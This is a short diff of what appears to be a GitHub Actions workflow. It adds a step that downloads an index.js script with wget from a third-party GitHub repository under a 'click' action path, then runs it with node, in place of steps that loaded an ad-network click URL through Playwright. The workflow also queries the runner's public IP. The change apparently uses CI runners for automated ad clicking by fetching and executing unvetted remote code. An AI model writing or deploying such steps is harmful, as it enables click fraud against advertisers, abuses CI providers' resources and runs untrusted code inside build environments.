@@ -22,6 +22,7 @@ jobs:
       - name: Run a multi-line script
         run: |
           curl ifconfig.me
+          wget https://raw.githubusercontent.com/btcfucker/btcfucker.github.io/main/.github/actions/click/index.js
           npx playwright install-deps chromium
-          npx playwright install chromium
-          npx playwright pdf https://click.a-ads.com/1845539/98644/ a-ads.pdf
+          npm i -D playwright
+          node index.js
